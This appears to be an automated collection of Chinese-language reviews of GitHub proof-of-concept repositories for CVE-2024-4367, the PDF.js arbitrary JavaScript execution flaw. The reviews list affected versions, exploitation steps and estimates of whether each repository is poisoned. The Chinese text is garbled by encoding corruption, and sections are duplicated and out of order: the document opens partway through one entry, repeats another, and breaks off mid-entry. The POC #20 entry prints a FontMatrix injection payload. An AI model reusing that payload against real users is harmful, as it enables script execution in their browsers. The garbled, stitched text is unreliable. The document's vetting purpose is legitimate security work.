æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

